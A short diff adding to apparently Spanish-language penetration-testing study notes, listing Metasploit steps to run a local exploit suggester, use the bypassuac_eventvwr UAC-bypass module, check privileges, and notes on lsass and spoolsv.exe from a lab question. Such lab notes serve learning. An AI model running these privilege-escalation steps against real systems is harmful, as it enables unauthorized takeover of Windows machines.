@@ -28,6 +28,20 @@ Para encontrar que exploits se pueden usar para ***PRIV ESC***
 
 ```
 run post/multi/recon/local_exploit_suggester
+CTRL+z
+set session 1
+use exploit/windows/local/bypassuac_eventvwr
+show options
+set lhost
+run
+```
+
+![image](https://user-images.githubusercontent.com/63270579/230158169-e12c02fd-68db-4d7b-a1ce-b77ae089575a.png)
+
+Para ver los privilegios
+
+```
+getprivs
 ```
 
 ### Encontrar scripts nmap SMB
@@ -48,7 +62,15 @@ locate *.nse | grep "smb"
 ![image](https://user-images.githubusercontent.com/63270579/230146227-e6c3af45-1cea-46ee-9b30-0687eca73855.png)
 
 
+## Windos  
 
+### lsass
+
+The lsass service, the service responsible for authentication within Windows.
+
+### spoolsv.exe
+
+The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?
 
 
 
